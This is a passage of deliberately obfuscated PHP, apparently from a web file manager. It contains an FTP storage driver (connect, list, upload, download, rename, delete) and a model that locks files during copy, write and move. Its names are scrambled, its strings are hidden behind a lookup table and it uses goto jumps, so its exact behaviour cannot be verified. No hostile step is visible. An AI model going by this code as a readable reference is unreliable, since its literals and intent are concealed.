KodIO::clear($î¨Õ…·‚); $çÇ§¬½ = KodIO::clear($çÇ§¬½); $çÇ§¬½ = substr($çÇ§¬½, strlen($î¨Õ…·‚)); if (empty($this->pathDriver)) { return $çÇ§¬½; } return $this->pathDriver . $è şÚç¬[8] . ltrim($çÇ§¬½, $è şÚç¬[8]); } private function _init($¨üóÜ = array()) { $ĞôàİÛÈ =& $_SERVER[Ö†ØøÖ±]; if (!function_exists($ĞôàİÛÈ[1407])) { throw new Exception(LNG($ĞôàİÛÈ[1408])); } $this->config = $¨üóÜ; $this->charsetReset($¨üóÜ); foreach ($¨üóÜ as $šæßâ‚Ó => $ÎÌÈ) { if (isset($this->{$šæßâ‚Ó})) { $this->{$šæßâ‚Ó} = $ÎÌÈ; } } return $this->_login($¨üóÜ); } private function _login($úŠíŞ·) { $Ûü™Ò¤„ =& $_SERVER[Ö†ØøÖ±]; static $ÊºÁ¸° = array(); $éõèà·î = md5(json_encode($úŠíŞ·)); if (isset($ÊºÁ¸°[$éõèà·î])) { foreach ($ÊºÁ¸°[$éõèà·î] as $‹Êæ¥ûğ => $À´®´äö) { $this->{$‹Êæ¥ûğ} = $À´®´äö; } return !0; } $ÈÕ¼· = parse_url(trim($this->server, $Ûü™Ò¤„[8])); $this->host = $ÈÕ¼·[$Ûü™Ò¤„[196]]; $ª„ü˜¥Ü = isset($ÈÕ¼·[$Ûü™Ò¤„[195]]) && $ÈÕ¼·[$Ûü™Ò¤„[195]] == $Ûü™Ò¤„[1409] ? !0 : !1; $this->scheme = $ª„ü˜¥Ü ? $Ûü™Ò¤„[1410] : $Ûü™Ò¤„[1411]; $this->port = isset($ÈÕ¼·[$Ûü™Ò¤„[197]]) ? $ÈÕ¼·[$Ûü™Ò¤„[197]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $ßŠµ§Ãİ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $™éÓË…˜ = $this->pasv == $Ûü™Ò¤„[88] ? !0 : !1; @ftp_pasv($this->connect, $™éÓË…˜); $ÊºÁ¸°[$éõèà·î] = array($Ûü™Ò¤„[1412] => $this->connect, $Ûü™Ò¤„[196] => $this->host, $Ûü™Ò¤„[195] => $this->scheme, $Ûü™Ò¤„[197] => $this->port); return $ßŠµ§Ãİ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($¹Á õì», $û’Ò Âä = '', $Œ¶ºîñ = REPEAT_RENAME) { if ($this->setContent($¹Á õì», $û’Ò Âä)) { return $this->getPathOuter($¹Á õì»); } return !1; } public function mkdir($à¶›‚ú, $àá—ğ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $à¶›‚ú = $this->iconvSystem($à¶›‚ú); if ($this->_isFolder($à¶›‚ú) || @ftp_mkdir($this->connect, $à¶›‚ú)) { return $this->getPathOuter($à¶›‚ú); } if (!$this->mkdir($this->pathFather($à¶›‚ú))) { return !1; } if ($à¶›‚ú = @ftp_mkdir($this->connect, $à¶›‚ú)) { return $this->getPathOuter($à¶›‚ú); } return !1; } public function copyFile($¤¦Ïäù“, $¡íƒ½¿) { if (!$this->_isconn()) { return !1; } $çåÒù‹ë = $this->pathThis($this->iconvSystem($¤¦Ïäù“)); $Ñ©…äİÆ = $this->tempFile($çåÒù‹ë); $éí¢è ° = $this->iconvApp($Ñ©…äİÆ); $this->download($¤¦Ïäù“, $éí¢è °); $áõ³ÂòÇ = $this->upload($¡íƒ½¿, $éí¢è °); $this->tempFileRemve($Ñ©…äİÆ); return $áõ³ÂòÇ; } public function moveFile($Úí¾ÙÖ·, $®óŠÖˆŞ) { if (!$this->_isconn()) { return !1; } $Úí¾ÙÖ· = $this->iconvSystem($Úí¾ÙÖ·); $®óŠÖˆŞ = $this->iconvSystem($®óŠÖˆŞ); $ğ£”¶³· = @ftp_rename($this->connect, $Úí¾ÙÖ·, $®óŠÖˆŞ); return $ğ£”¶³· ? $this->getPathOuter($®óŠÖˆŞ) : !1; } public function delFile($Ü’ä‘ıı) { if (!$this->_isconn()) { return !1; } $Ü’ä‘ıı = $this->iconvSystem($Ü’ä‘ıı); return @ftp_delete($this->connect, $Ü’ä‘ıı); } public function delFolder($×àª¤„ş) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Â×Ø¾Ó¶ = $‰²õ«É¬ = array(); $this->fileList($×àª¤„ş, $Â×Ø¾Ó¶, $‰²õ«É¬, !0); $this->listItemCache = !0; foreach ($‰²õ«É¬ as $±×€ğï) { $¶šÜúñ = $this->iconvSystem($±×€ğï[$_SERVER[Ö†ØøÖ±][32]]); $ÇÔŒ–öÓ = @ftp_delete($this->connect, $¶šÜúñ); if (!$ÇÔŒ–öÓ) { return !1; } } foreach ($Â×Ø¾Ó¶ as $¶šÜúñ) { $¶šÜúñ = $this->iconvSystem($¶šÜúñ); $ÇÔŒ–öÓ = @ftp_rmdir($this->connect, $¶šÜúñ); if (!$ÇÔŒ–öÓ) { return !1; } } $×àª¤„ş = $this->iconvSystem($×àª¤„ş); return @ftp_rmdir($this->connect, $×àª¤„ş); } public function rename($ğÏ€ƒ¶Ç, $Œ»ªà¹Ù) { $Èô§£ =& $_SERVER[Ö†ØøÖ±]; if (!$this->_isconn()) { return !1; } $›Ï…äº = $this->fileNameAuto($this->pathFather($ğÏ€ƒ¶Ç), $Œ»ªà¹Ù); $›Ï…äº = $this->iconvSystem($›Ï…äº); $ğÏ€ƒ¶Ç = $this->iconvSystem($ğÏ€ƒ¶Ç); $â­ÖŸ†‘ = $this->pathFather($ğÏ€ƒ¶Ç); $ùŒèø×˜ = rtrim($â­ÖŸ†‘, $Èô§£[8]) . $Èô§£[8] . $›Ï…äº; $›˜…€õ = @ftp_rename($this->connect, $ğÏ€ƒ¶Ç, $ùŒèø×˜); $ùŒèø×˜ = $this->iconvApp($ùŒèø×˜); return $›˜…€õ ? $this->getPathOuter($ùŒèø×˜) : !1; } private function folderInfo($¬ò¤¹›, $¥ûŞ“­” = false) { $ÜÆŞ¹…û =& $_SERVER[Ö†ØøÖ±]; $æâ˜ıÌ = array($ÜÆŞ¹…û[32] => $this->pathThis($¬ò¤¹›), $ÜÆŞ¹…û[84] => $this->getPathOuter($ÜÆŞ¹…û[8] . $¬ò¤¹›), $ÜÆŞ¹…û[33] => $ÜÆŞ¹…û[75]); if ($¥ûŞ“­”) { return $æâ˜ıÌ; } $æâ˜ıÌ[$ÜÆŞ¹…û[215]] = $æâ˜ıÌ[$ÜÆŞ¹…û[85]] = 0; $æâ˜ıÌ[$ÜÆŞ¹…û[216]] = $æâ˜ıÌ[$ÜÆŞ¹…û[217]] = !0; return $æâ˜ıÌ; } private function fileInfo($ŒÇŠ§±ª, $‚¿Œ´ ü = false, $ü€×¼ÙÂ = array()) { $ø´íÑ =& $_SERVER[Ö†ØøÖ±]; $¯¸…¿’´ = array($ø´íÑ[32] => $this->pathThis($ŒÇŠ§±ª), $ø´íÑ[84] => $this->getPathOuter($ø´íÑ[8] . $ŒÇŠ§±ª), $ø´íÑ[33] => $ø´íÑ[214], $ø´íÑ[76] => isset($ü€×¼ÙÂ[$ø´íÑ[76]]) ? $ü€×¼ÙÂ[$ø´íÑ[76]] : 0, $ø´íÑ[175] => $this->ext($ŒÇŠ§±ª)); if ($‚¿Œ´ ü) { return $¯¸…¿’´; } $¯¸…¿’´[$ø´íÑ[215]] = $¯¸…¿’´[$ø´íÑ[85]] = 0; $¯¸…¿’´[$ø´íÑ[216]] = $¯¸…¿’´[$ø´íÑ[217]] = !0; $Â‚±­¬° = $this->iconvSystem($ŒÇŠ§±ª); $¯¸…¿’´[$ø´íÑ[85]] = @ftp_mdtm($this->connect, $Â‚±­¬°); if (empty($ü€×¼ÙÂ)) { $ü€×¼ÙÂ = $this->objectMeta($ŒÇŠ§±ª); if (!$ü€×¼ÙÂ) { return $¯¸…¿’´; } } $¯¸…¿’´[$ø´íÑ[76]] = $ü€×¼ÙÂ[$ø´íÑ[76]]; return $¯¸…¿’´; } public function size($ÜéåÇĞ´) { $åÎ‰ö = $this->objectMeta($ÜéåÇĞ´); return $åÎ‰ö ? $åÎ‰ö[$_SERVER[Ö†ØøÖ±][76]] : 0; } public function info($Ø…Ò˜­Î) { if ($this->isFile($Ø…Ò˜­Î)) { return $this->fileInfo($Ø…Ò˜­Î, 0); } else { if ($this->isFolder($Ø…Ò˜­Î)) { return $this->folderInfo($Ø…Ò˜­Î); } } return !1; } private function fileList($¡›Ôİ‰, &$‰Ì“Êó¹, &$×ó¥‚‹, $Ÿ½ ú  = false) { $ºÚµîÇÚ =& $_SERVER[Ö†ØøÖ±]; $¡›Ôİ‰ = $this->iconvSystem($¡›Ôİ‰); if (!$this->isFolder($¡›Ôİ‰)) { return !1; } @ftp_chdir($this->connect, $ºÚµîÇÚ[8]); $¡›Ôİ‰ = rtrim($¡›Ôİ‰, $ºÚµîÇÚ[8]) . $ºÚµîÇÚ[8]; check_abort(); $ŒƒóĞ¬É = @ftp_rawlist($this->connect, $¡›Ôİ‰); if (!$ŒƒóĞ¬É) { $ŒƒóĞ¬É = array(); } $¾œ„’çå = array($ºÚµîÇÚ[10] => 1, $ºÚµîÇÚ[1331] => 1); foreach ($ŒƒóĞ¬É as $„“ÎÅ¬†) { $’‰öù¨ = $this->_listItem($„“ÎÅ¬†); if ($’‰öù¨[0] == $ºÚµîÇÚ[811]) { continue; } $“à«æÎÁ = $’‰öù¨[8]; if (empty($“à«æÎÁ) && $“à«æÎÁ !== $ºÚµîÇÚ[212] || isset($¾œ„’çå[$“à«æÎÁ])) { continue; } $“à«æÎÁ = $this->iconvApp($¡›Ôİ‰ . ltrim($“à«æÎÁ, $ºÚµîÇÚ[8])); $ƒ¦üÇ³È = array($ºÚµîÇÚ[32] => $“à«æÎÁ, $ºÚµîÇÚ[33] => $ºÚµîÇÚ[214], $ºÚµîÇÚ[76] => $’‰öù¨[4]); if (substr($„“ÎÅ¬†, 0, 1) == $ºÚµîÇÚ[1413]) { $ƒ¦üÇ³È[$ºÚµîÇÚ[33]] = $ºÚµîÇÚ[75]; $ƒ¦üÇ³È[$ºÚµîÇÚ[76]] = 0; } $äÖ¬¢š = $ƒ¦üÇ³È[$ºÚµîÇÚ[33]] == $ºÚµîÇÚ[75] ? !0 : !1; $this->cacheMethodInfoSet($“à«æÎÁ, $äÖ¬¢š, $ƒ¦üÇ³È); if ($äÖ¬¢š) { $‰Ì“Êó¹[] = $“à«æÎÁ; if ($Ÿ½ ú ) { $this->fileList($“à«æÎÁ, $‰Ì“Êó¹, $×ó¥‚‹, $Ÿ½ ú ); } continue; } $×ó¥‚‹[] = $ƒ¦üÇ³È; } $this->cacheMethodInfoSet($¡›Ôİ‰, !0); } private function _listItem($ˆ­ç¾¶Õ) { if (empty($ˆ­ç¾¶Õ)) { return array(); } $´Ú½Ş°Ê = preg_split($_SERVER[Ö†ØøÖ±][1414], $ˆ­ç¾¶Õ); if (count($´Ú½Ş°Ê) <= 9) { return $´Ú½Ş°Ê; } $´Ú½Ş°Ê[8] = trim(substr($ˆ­ç¾¶Õ, strpos($ˆ­ç¾¶Õ, $´Ú½Ş°Ê[7]) + strlen($´Ú½Ş°Ê[7]))); return array_splice($´Ú½Ş°Ê, 0, 9); } public function listPath($Àòİ…¸ç, $¸Ç½Ö“Æ = false) { $‚‘ù±Üé =& $_SERVER[Ö†ØøÖ±]; if (!$this->_isconn()) { return !1; } $ì¦ÓÚ¸¡ = $Ùå®›¾Ü = array(); $this->fileList($Àòİ…¸ç, $ì¦ÓÚ¸¡, $Ùå®›¾Ü); foreach ($ì¦ÓÚ¸¡ as $¥€˜Â–û => $©² ¢Ëô) { $ì¦ÓÚ¸¡[$¥€˜Â–û] = $this->folderInfo($©² ¢Ëô, $¸Ç½Ö“Æ); } foreach ($Ùå®›¾Ü as $¥€˜Â–û => $©² ¢Ëô) { $Ùå®›¾Ü[$¥€˜Â–û] = $this->fileInfo($©² ¢Ëô[$‚‘ù±Üé[32]], $¸Ç½Ö“Æ, $©² ¢Ëô); } return array($‚‘ù±Üé[82] => $ì¦ÓÚ¸¡, $‚‘ù±Üé[83] => $Ùå®›¾Ü); } public function has($àä±Ó˜€, $÷›ŒõŠÍ = false, $÷Ø‹Üàº = true) { $ùŒßµƒõ =& $_SERVER[Ö†ØøÖ±]; $‚Ñ³Õ€´ = $ê¬âıØ‘ = array(); $¬¦‡ûó¾ = $÷›ŒõŠÍ ? !0 : !1; $this->fileList($àä±Ó˜€, $‚Ñ³Õ€´, $ê¬âıØ‘, $¬¦‡ûó¾); if ($÷›ŒõŠÍ) { return array($ùŒßµƒõ[223] => count($ê¬âıØ‘), $ùŒßµƒõ[224] => count($‚Ñ³Õ€´)); } if ($÷Ø‹Üàº) { if (count($ê¬âıØ‘)) { return !0; } } else { if (count($‚Ñ³Õ€´)) { return !0; } } return !1; } public function listAll($©‡„¬ã…) { $Å¸¾ıûú =& $_SERVER[Ö†ØøÖ±]; if (!$this->_isconn()) { return !1; } $³Æ÷–°é = $ÊÎÏ€ªÖ = array(); $this->fileList($©‡„¬ã…, $³Æ÷–°é, $ÊÎÏ€ªÖ, !0); $·óİœì— = array_to_keyvalue($ÊÎÏ€ªÖ, $Å¸¾ıûú[32]); foreach ($³Æ÷–°é as $¬†¼¨§) { if (is_string($¬†¼¨§)) { $·óİœì—[$¬†¼¨§] = array($Å¸¾ıûú[76] => 0); } } return $this->listAllFiles($©‡„¬ã…, $·óİœì—); } public function getContent($‡ª®é´Š) { if (!$this->_isconn()) { return !1; } $‡ª®é´Š = $this->iconvSystem($‡ª®é´Š); return $this->fileSubstr($‡ª®é´Š); } public function setContent($’¯ÍŠ‹í, $¨şÃ¾†ë = '') { if (!$this->_isconn()) { return !1; } $—½Éæ = $this->pathThis($this->iconvSystem($’¯ÍŠ‹í)); $Ûñ‰ÛÒ = $this->tempFile($—½Éæ); file_put_contents($Ûñ‰ÛÒ, $¨şÃ¾†ë); $­²³â¸„ = $this->upload($’¯ÍŠ‹í, $this->iconvApp($Ûñ‰ÛÒ)); $this->tempFileRemve($Ûñ‰ÛÒ); return $­²³â¸„; } public function fileSubstr($ïá‘ª”, $¤ûé ÆÏ = 0, $î“™ıöå = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ïá‘ª”, $¤ûé ÆÏ, $î“™ıöå); } private function ftpRequest($Éñµ× , $ÔûˆÎË³ = 0, $úæšî›Ó = false) { $Éñµ×  = $this->iconvSystem($Éñµ× ); $½´À®®Û = $this->scheme . $this->host . $_SERVER[Ö†ØøÖ±][4] . $this->port; $ğ±®îáÓ = curl_init(); curl_setopt($ğ±®îáÓ, CURLOPT_URL, $½´À®®Û . $this->pathEncode($Éñµ× )); curl_setopt($ğ±®îáÓ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($úæšî›Ó) { $âÛ‹ÊŞ© = $ÔûˆÎË³ + $úæšî›Ó - 1; curl_setopt($ğ±®îáÓ, CURLOPT_RANGE, "{$ÔûˆÎË³}\55{$âÛ‹ÊŞ©}"); } curl_setopt($ğ±®îáÓ, CURLOPT_RETURNTRANSFER, 1); $Ú¾ª† = curl_exec($ğ±®îáÓ); curl_close($ğ±®îáÓ); return $Ú¾ª†; } public function upload($øÍì¿æ, $„ô«Âˆè, $ ¢° Ì° = false, $³íïÃ‹€ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($øÍì¿æ))) { return !1; } $øÍì¿æ = $this->iconvSystem($øÍì¿æ); $„ô«Âˆè = $this->iconvSystem($„ô«Âˆè); $ÌÁÇˆ´Â = ftp_nb_put($this->connect, $øÍì¿æ, $„ô«Âˆè, FTP_BINARY); while ($ÌÁÇˆ´Â == FTP_MOREDATA) { $ÌÁÇˆ´Â = ftp_nb_continue($this->connect); } if ($ÌÁÇˆ´Â != FTP_FINISHED) { return !1; } return $this->getPathOuter($øÍì¿æ); } public function download($­›¶±íË, $èòş­ùæ = '') { if (!$this->_isconn()) { return !1; } $†Ëâ¸«„ = $this->pathFather($èòş­ùæ); if (!IO::mkdir($†Ëâ¸«„)) { return !1; } $­›¶±íË = $this->iconvSystem($­›¶±íË); $èòş­ùæ = $this->iconvSystem($èòş­ùæ); $˜Èìî“ = ftp_nb_get($this->connect, $èòş­ùæ, $­›¶±íË, FTP_BINARY); while ($˜Èìî“ == FTP_MOREDATA) { $˜Èìî“ = ftp_nb_continue($this->connect); } if ($˜Èìî“ != FTP_FINISHED) { return !1; } return $this->iconvApp($èòş­ùæ); } public function exist($°„«Ü§¬) { return $this->isFile($°„«Ü§¬) || $this->isFolder($°„«Ü§¬); } public function isFile($«Å½êƒ) { return !$this->isFolder($«Å½êƒ) && $this->objectMeta($«Å½êƒ); } public function isFolder($†®Äˆâ) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][166], $†®Äˆâ); } protected function objectMeta($Çó½‡–¾) { return $this->cacheMethod($_SERVER[Ö†ØøÖ±][168], $Çó½‡–¾); } protected function _objectMeta($…·¦ƒ®û) { $¶Çö‚ËÈ =& $_SERVER[Ö†ØøÖ±]; if ($…·¦ƒ®û == $¶Çö‚ËÈ[12] || $…·¦ƒ®û == $¶Çö‚ËÈ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $…·¦ƒ®û = $this->iconvSystem($…·¦ƒ®û); $ŠëŸşª = array($¶Çö‚ËÈ[32] => $this->iconvApp($…·¦ƒ®û), $¶Çö‚ËÈ[33] => $¶Çö‚ËÈ[214], $¶Çö‚ËÈ[76] => 0); @ftp_chdir($this->connect, $¶Çö‚ËÈ[8]); $ÀÈøãšá = @ftp_size($this->connect, $…·¦ƒ®û); if ($ÀÈøãšá != -1) { $ŠëŸşª[$¶Çö‚ËÈ[76]] = $ÀÈøãšá; } else { $Ü²¹ñÉ¶ = @ftp_chdir($this->connect, $…·¦ƒ®û); if (!$Ü²¹ñÉ¶) { return !1; } $ŠëŸşª[$¶Çö‚ËÈ[33]] = $¶Çö‚ËÈ[75]; } return $ŠëŸşª; } protected function _isFolder($ØŸÖá«) { $íêÍôÈà =& $_SERVER[Ö†ØøÖ±]; if ($ØŸÖá« == $íêÍôÈà[12] || $ØŸÖá« == $íêÍôÈà[8]) { return !0; } $˜ú‚àëñ = $this->_objectMeta($ØŸÖá«); return isset($˜ú‚àëñ[$íêÍôÈà[33]]) && $˜ú‚àëñ[$íêÍôÈà[33]] == $íêÍôÈà[75] ? !0 : !1; } } goto bÈë™©¹…›; FÓ¸ÚÉ£«š: define($_SERVER[Ö†ØøÖ±][282], 1); define($_SERVER[Ö†ØøÖ±][283], 2); define($_SERVER[Ö†ØøÖ±][284], 3); goto D®ì‰Œ–„Š; d´ì¢»µë…: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($°î¥ºìÀ) { $½°Ó£Êó =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($½°Ó£Êó[595], $°î¥ºìÀ); $Å÷§’à = 1; $this->_lockEvent($°î¥ºìÀ, array($½°Ó£Êó[596], $½°Ó£Êó[597]), $Å÷§’à); $this->_lockParent($°î¥ºìÀ, array($½°Ó£Êó[597]), $Å÷§’à); $this->_lockEvent($°î¥ºìÀ, array($½°Ó£Êó[598], $½°Ó£Êó[599]), $Å÷§’à); $this->_lockCheckEnd($½°Ó£Êó[595], $°î¥ºìÀ); } public function lockCopyEnd($ìç‰±Ìú) { $±íÁóÛ =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $¬ˆÆ–Åõ = 0; $this->_lockEvent($ìç‰±Ìú, array($±íÁóÛ[596], $±íÁóÛ[597]), $¬ˆÆ–Åõ); $this->_lockParent($ìç‰±Ìú, array($±íÁóÛ[597]), $¬ˆÆ–Åõ); $this->_lockEvent($ìç‰±Ìú, array($±íÁóÛ[598], $±íÁóÛ[599]), $¬ˆÆ–Åõ); } public function lockWriteStart($ª€÷Ê»², $ïÌõÔ¨° = '') { $‰Æ…Â‡ô =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($‰Æ…Â‡ô[596], $ª€÷Ê»²); $ıÜ°íÄì = 1; $this->_lockKey($‰Æ…Â‡ô[600] . $ª€÷Ê»² . $‰Æ…Â‡ô[10] . $ïÌõÔ¨°, $ıÜ°íÄì); $this->_lockEvent($ª€÷Ê»², array($‰Æ…Â‡ô[595], $‰Æ…Â‡ô[597]), $ıÜ°íÄì); $this->_lockParent($ª€÷Ê»², array($‰Æ…Â‡ô[595], $‰Æ…Â‡ô[597]), $ıÜ°íÄì); $this->_lockCheckEnd($‰Æ…Â‡ô[596], $ª€÷Ê»²); } public function lockWriteEnd($‡×ˆÂ‹‘, $ñù¨ØŠ¤ = '') { $ÛÉ‚˜ó¤ =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $¤´à‰Á› = 0; $this->_lockKey($ÛÉ‚˜ó¤[600] . $‡×ˆÂ‹‘ . $ÛÉ‚˜ó¤[10] . $ñù¨ØŠ¤, $¤´à‰Á›); $this->_lockEvent($‡×ˆÂ‹‘, array($ÛÉ‚˜ó¤[595], $ÛÉ‚˜ó¤[597]), $¤´à‰Á›); $this->_lockParent($‡×ˆÂ‹‘, array($ÛÉ‚˜ó¤[595], $ÛÉ‚˜ó¤[597]), $¤´à‰Á›); } public function lockMoveStart($»­ùÙ) { $Â“’èÙ¯ =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $this->_lockCheck($Â“’èÙ¯[597], $»­ùÙ); $§¤Úúæ = 1; $this->_lockKey($Â“’èÙ¯[601] . $»­ùÙ, $§¤Úúæ); $this->_lockEvent($»­ùÙ, array($Â“’èÙ¯[595], $Â“’èÙ¯[596]), $§¤Úúæ); $this->_lockParent($»­ùÙ, array($Â“’èÙ¯[595], $Â“’èÙ¯[597]), $§¤Úúæ); $this->_lockEvent($»­ùÙ, array($Â“’èÙ¯[602], $Â“’èÙ¯[598], $Â“’èÙ¯[599]), $§¤Úúæ); $this->_lockCheckEnd($Â“’èÙ¯[597], $»­ùÙ); } public function lockMoveEnd($Ç¢›ªñ) { $Ÿ”ûîÓ =& $_SERVER[Ö†ØøÖ±]; if (!$this->allowLock()) { return; } $§ìˆ¸äñ = 0; $this->_lockKey($Ÿ”ûîÓ[601] . $Ç¢›ªñ, $§ìˆ¸äñ); $this->_lockEvent($Ç¢›ªñ, array($Ÿ”ûîÓ[595], $Ÿ”ûîÓ[596]), $§ìˆ¸äñ); $this->_lockParent($Ç¢›ªñ, array($Ÿ”ûîÓ[595], $Ÿ”ûîÓ[597]), $§ìˆ¸äñ); $this->_lockEvent($Ç¢›ªñ, array($Ÿ”ûîÓ[602], $Ÿ”ûîÓ[598], $Ÿ”ûîÓ[599]), $§ìˆ¸äñ); } private function _lockCheck($‹ëí°İà, $¯í‹’ì­) { $ôä–Ô¦ª =& $_SERVER[Ö†ØøÖ±]; $¢ïŠ˜Ì± = $this->sourceInfo($¯í‹’ì­); $âüµˆÇÁ = $‹ëí°İà . $ôä–Ô¦ª[10] . $¯í‹’ì­; $this->_lockTimeStart[$âüµˆÇÁ] = timeFloat(); if (!is_array($¢ïŠ˜Ì±)) { return; } $àµÕ§ = LNG($ôä–Ô¦ª[603]); CacheLock::setErrorMsg($ôä–Ô¦ª[163] . htmlspecialchars($¢ïŠ˜Ì±[$ôä–Ô¦ª[32]]) . $ôä–Ô¦ª[165] . $àµÕ§); $this->_lockKey($âüµˆÇÁ, 1); $this->_lockKey($âüµˆÇÁ, 0); $ıÌ•«ËŒ = array_reverse($this->parentLevelArray($¢ïŠ˜Ì±[$ôä–Ô¦ª[562]])); foreach ($ıÌ•«ËŒ as $ğ¡õ†ù•) { $âüµˆÇÁ = $‹ëí°İà . $ôä–Ô¦ª[604] . $ğ¡õ†ù•; if (CacheLock::lockGet($ôä–Ô¦ª[605] . $âüµˆÇÁ)) { $¢ïŠ˜Ì± = $this->sourceInfo($ğ¡õ†ù•); CacheLock::setErrorMsg($ôä–Ô¦ª[163] . htmlspecialchars($¢ïŠ˜Ì±[$ôä–Ô¦ª[32]]) . $ôä–Ô¦ª[165] . $àµÕ§); $this->_lockKey($âüµˆÇÁ, 1); $this->_lockKey($âüµˆÇÁ, 0); } } } private function _lockCheckEnd($Î–¨ƒ®, $ÂÌö¨úº) { $€“»«ù =& $_SERVER[Ö†ØøÖ±]; $ øÇ¹îê = $Î–¨ƒ® . $€“»«ù[10] . $ÂÌö¨úº; CacheLock::setErrorMsg($€“»«ù[296]); if (!isset($this->_lockTimeStart[$ øÇ¹îê])) { return; } $Õ½ìİÛş = timeFloat() - $this->_lockTimeStart[$ øÇ¹îê]; unset($this->_lockTimeStart[$ øÇ¹îê]); if ($Õ½ìİÛş > 0.5) { unset(self::$cacheSourceInfo[$€“»«ù[510] . $ÂÌö¨úº]); } $¨è‡¡Œ” = $this->sourceInfo($ÂÌö¨úº); if (!$¨è‡¡Œ”) { show_json(LNG($€“»«ù[105]), !1); } } private function _lockParent($´ı¹Åé, $¿ç“úÁ, $¤ı‰ÒË•) { if (!$this->autoLockSet) { return; } $ßÚ´‘»Ê = $this->sourceInfo($´ı¹Åé); if (!is_array($ßÚ´‘»Ê)) { return; } $ß–Ùª® = array_reverse($this->parentLevelArray($ßÚ´‘»Ê[$_SERVER[Ö†ØøÖ±][562]])); foreach ($ß–Ùª® as $Ğ¶ì„§) { $this->_lockEvent($Ğ¶ì„§, $¿ç“úÁ, $¤ı‰ÒË•); } } private function _lockEvent($Ì‘’Í£í, $‰èÊ°Óª, $¥û•ÙÇ™) { $ğ˜‹’Î  =& $_SERVER[Ö†ØøÖ±]; if (!$this->autoLockSet) { return; } foreach ($‰èÊ°Óª as $áá×”–á) { $½´ğÙÖğ = $áá×”–á . $ğ˜‹’Î [10] . $Ì‘’Í£í; if ($¥û•ÙÇ™ && CacheLock::lockGet($ğ˜‹’Î [605] . $½´ğÙÖğ)) { continue; } $this->_lockKey($½´ğÙÖğ, $¥û•ÙÇ™); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($°Ï‹›¬·, $ßëƒ¿„õ = 1) { $‡½õçÓ¥ = $_SERVER[Ö†ØøÖ±][605] . md5($°Ï‹›¬·); if ($ßëƒ¿„õ) { if (isset(self::$_lockItemArr[$‡½õçÓ¥])) { return; } self::$_lockItemArr[$‡½õçÓ¥] = 1; CacheLock::lock($‡½õçÓ¥, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$‡½õçÓ¥])) { return; } unset(self::$_lockItemArr[$‡½õçÓ¥]); CacheLock::unlock($‡½õçÓ¥); } } public function isParentOf($ı£ß¤À“, $’˜Ïã©) { $­¯ûƒœç =& $_SERVER[Ö†ØøÖ±]; $ÌÚ¦ıÑ› = $this->sourceInfo($ı£ß¤À“); $ğ¤âèÚÏ = $this->sourceInfo($’˜Ïã©); $±ƒ¬…‹ë = $ÌÚ¦ıÑ›[$­¯ûƒœç[562]] . $ÌÚ¦ıÑ›[$­¯ûƒœç[181]] . $­¯ûƒœç[50]; $ı—Ö—ä“ = $ğ¤âèÚÏ[$­¯ûƒœç[562]] . $ğ¤âèÚÏ[$­¯ûƒœç[181]] . $­¯ûƒœç[50]; $£Ç›†µÈ = strpos($ı—Ö—ä“, $±ƒ¬…‹ë) === 0; return $£Ç›†µÈ; } private $targetIsDelete = 0; public function copy($‡”¢ÈÕÁ, $‰®†Ã›Û, $²æğŞ‰ = REPEAT_REPLACE, $öÒØÅ¯  = '') { $¦¿£éã =& $_SERVER[Ö†ØøÖ±]; $Öò…†Ş = $this->sourceInfo($‡”¢ÈÕÁ); $í§ü¶É† = $this->sourceInfo($‰®†Ã›Û); if (!$Öò…†Ş || !$í§ü¶É† || $í§ü¶É†[$¦¿£éã[462]] != $¦¿£éã[88]) { return !1; } if ($this->isParentOf($‡”¢ÈÕÁ, $‰®†Ã›Û)) { return !1; } $ßÈßÂ®ª = $öÒØÅ¯  ? $öÒØÅ¯  : $Öò…†Ş[$¦¿£éã[32]]; $this->lockCopyStart($‡”¢ÈÕÁ); $this->lockWriteStart($‰®†Ã›Û, $ßÈßÂ®ª); $Õ›¬üËˆ = array($¦¿£éã[606] => array(), $¦¿£éã[607] => array(), $¦¿£éã[608] => array()); $this->targetIsDelete = intval($Öò…†Ş[$¦¿£éã[482]]); $ß¬‰ËŸ = $this->fileNameExistAuto($‰®†Ã›Û, $Öò…†Ş); $İí¿ÅÓ° = $this->_copy($‡”¢ÈÕÁ, $‰®†Ã›Û, $²æğŞ‰, $Õ›¬üËˆ, !0, $öÒØÅ¯ ); $this->_childrenListClear(); $this->lockCopyEnd($‡”¢ÈÕÁ); $this->lockWriteEnd($‰®†Ã›Û, $ßÈßÂ®ª); if ($Öò…†Ş[$¦¿£éã[462]] == $¦¿£éã[88] && $ß¬‰ËŸ == $İí¿ÅÓ°) { $this->folderSizeResetChildren($ß¬‰ËŸ); } Model($¦¿£éã[609])->addAll($Õ›¬üËˆ[$¦¿£éã[607]], array(), !0); if ($ß¬‰ËŸ != $İí¿ÅÓ° || $Öò…†Ş[$¦¿£éã[462]] == $¦¿£éã[88]) { Model($¦¿£éã[610])->eventCopy($İí¿ÅÓ°); } $this->saveAll($Õ›¬üËˆ[$¦¿£éã[608]]); Model($¦¿£éã[214])->linkAdd($Õ›¬üËˆ[$¦¿£éã[606]]); $this->folderSizeReset($‰®†Ã›Û); $this->updateModifyTime($‰®†Ã›Û); return $İí¿ÅÓ°; } private function 